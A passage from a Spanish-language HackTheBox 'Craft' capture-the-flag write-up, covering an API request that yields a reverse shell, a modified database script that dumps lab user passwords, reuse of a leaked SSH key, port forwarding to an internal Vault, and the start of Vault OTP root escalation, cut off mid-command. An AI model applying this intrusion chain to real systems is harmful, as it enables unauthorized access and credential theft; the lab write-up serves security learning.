&lt;span class=&#34;n&#34;&gt;brew_dict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;brewer&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;bullshit&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;brew_dict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;style&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;bullshit&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;json_data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dumps&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;brew_dict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;https://api.craft.htb/api/brew/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;json_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verify&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al ejecutar el script obtenemos una shell inversa:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/craft/Screenshot%20from%202019-07-31%2001.44.04.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;mysql---dump-credentials&#34;&gt;MYSQL - Dump Credentials&lt;/h3&gt;
&lt;p&gt;Dentro del sistema de archivos encontramos los mismos archivos pertenecientes al repositorio, al ejecutar el archivo de &lt;code&gt;dbtest.py&lt;/code&gt; obtenemos una respuesta de la base de datos MySQL.&lt;/p&gt;
&lt;p&gt;Archivos:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/craft/Screenshot%20from%202019-07-31%2001.52.00.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Prueba dbtest.py&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/craft/Screenshot%20from%202019-07-31%2001.53.04.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Archivo settings.py con credenciales de la base de datos:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/craft/Screenshot%20from%202019-07-31%2002.03.52.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Para poder obtener Credenciales que se encuentran en la base de datos utilizamos nuevamente el repositorio, ya que en este se encuentra el modelo de las tablas de la base de datos, brew y user, por lo que podemos obtener facilmente las columnas y el nombre de las tablas.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;craft_api/database/models.py&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/craft/Screenshot%20from%202019-07-31%2001.55.08.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Para realizar un query a la base de datos utilizamos y modificamos el archivo &lt;code&gt;dbtest.py&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pymysql&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;sys&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;craft_api&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;settings&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;connection&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pymysql&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;connect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;settings&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MYSQL_DATABASE_HOST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;settings&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MYSQL_DATABASE_USER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;settings&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MYSQL_DATABASE_PASSWORD&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;db&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;settings&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MYSQL_DATABASE_DB&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;cursorclass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pymysql&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cursors&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DictCursor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;    
    &lt;span class=&#34;k&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;connection&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cursor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cursor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;sql&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sys&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;cursor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;execute&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cursor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fetchall&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;finally&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;connection&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Teniendo nuestro archivo listo utilizamos el siguiente query para obtener los datos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;user&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Archivo dbtest.py modificado:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/craft/Screenshot%20from%202019-07-31%2002.00.23.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos las credenciales que estan dentro de la base de datos, una de ellas ya la teniamos dentro del script test.py:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;
   &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
      &lt;span class=&#34;s1&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;dinesh&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
      &lt;span class=&#34;s1&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;4aUh0A8PbVJxgd&amp;#39;&lt;/span&gt;
   &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
   &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
      &lt;span class=&#34;s1&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ebachman&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
      &lt;span class=&#34;s1&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;llJ77D8QFkLPQB&amp;#39;&lt;/span&gt;
   &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
   &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
      &lt;span class=&#34;s1&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;gilfoyle&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
      &lt;span class=&#34;s1&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ZEU3N8WNM2rh4T&amp;#39;&lt;/span&gt;
   &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;user-gilfoyle---shell-ssh&#34;&gt;USER gilfoyle - SHELL SSH&lt;/h2&gt;
&lt;p&gt;Obtuvimos las credenciales de 3 &amp;ldquo;usuarios&amp;rdquo;, ninguno de ellos funciona en el servicio de SSH, pero dos de ellos si funcionan en la plataforma Gogs.&lt;/p&gt;
&lt;p&gt;Por un lado tenemos al usuario dinesh quien puede realizar cambios dentro del codigo del repositorio de la API de craft.&lt;/p&gt;
&lt;p&gt;Con el usuario gilfoyle nos muestra un repositorio más al del usuario dinesh este nos muestra como esta la infraestructura del &amp;lsquo;servidor&amp;rsquo;. Entre las cosas que tiene este repositorio encontramos el &amp;lsquo;craft-flask&amp;rsquo; el cual contiene la informacion para la Shell de privilegios bajos con la que pudimos obtener las credenciales, y, tambien informacion del servidor nginx, mysql, vault y ssh.&lt;/p&gt;
&lt;p&gt;En la carpeta .ssh encontramos la clave publica y privada del usuario gilfoyle perteneciente al servicio de SSH, utilizamos dicha clave para obtener una shell SSH. Al utilizar la clave nos pide una frase utilizamos la contraseña (&lt;code&gt;ZEU3N8WNM2rh4T&lt;/code&gt;) que encontramos en la base de datos de este usuario.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/craft/Screenshot%20from%202019-07-31%2002.16.57.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos una shell y nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Nuevamente volvemos al repositorio donde encontramos la infraestructura que tiene el servidor, dentro, encontramos en la carpeta vault la configuracion de esta plataforma, esta plataforma da el acceso y control de contraseñas, certificados, claves de APIs, contraseñas, etc.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/craft/Screenshot%20from%202019-08-08%2002.27.15.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;storage&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/vault/data&amp;#34;&lt;/span&gt;
      &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;ui&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;listener&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;tcp&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;nx&#34;&gt;address&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;0.0.0.0:8200&amp;#34;&lt;/span&gt;
      &lt;span class=&#34;nx&#34;&gt;tls_cert_file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/vault/pki/vault.craft.htb.crt&amp;#34;&lt;/span&gt;
      &lt;span class=&#34;nx&#34;&gt;tls_key_file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/vault/pki/vault.craft.htb.key&amp;#34;&lt;/span&gt;
      &lt;span class=&#34;nx&#34;&gt;tls_min_version&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;tls12&amp;#34;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Revisamos la documentacion de esta plataforma y las opciones que contiene este archivo. Encontramos que la plataforma esta corriendo en el puerto 8200 y su interfaz grafica (ui) esta desactivada. Dentro de la maquina especificamente en el archivo &lt;code&gt;/etc/hosts&lt;/code&gt; encontramos que la plataforma esta configurada en la ip y dominio:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;172.20.0.2 vault.craft.htb
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/craft/Screenshot%20from%202019-08-08%2002.31.27.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Comprobamos que la interfaz grafica este desactivada traemos &lt;code&gt;172.20.0.2&lt;/code&gt; con el puerto &lt;code&gt;8200&lt;/code&gt; localmente:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ssh -L 8200:172.20.0.2:8200 gilfoyle@10.10.10.110 -i gilfoyle_id_rsa
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;ssh&#34;&gt;SSH&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/craft/Screenshot%20from%202019-08-08%2002.34.50.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;local&#34;&gt;Local&lt;/h3&gt;
&lt;p&gt;Pudimos comprobar que la plataforma esta desactivada graficamente.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/craft/Screenshot%20from%202019-08-08%2002.36.26.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;root---one-time-password&#34;&gt;ROOT - One Time Password&lt;/h2&gt;
&lt;p&gt;One time password permite a algun usuario crear una contraseña cada vez que lo desee conectarse en el servicio SSH mediante comandos. De igual forma dentro del repositorio encontramos un archivo llamado &lt;code&gt;secret.sh&lt;/code&gt; el cual contiene una configuracion para activar ssh, crear un Rol con el usuario root con las IP que se representen dentro de &lt;code&gt;cidr_list&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html&#34;&gt;&lt;strong&gt;One Time SSH&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span class=&#34;nx&#34;&gt;vault&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;secrets&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;enable&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ssh&lt;/span&gt;

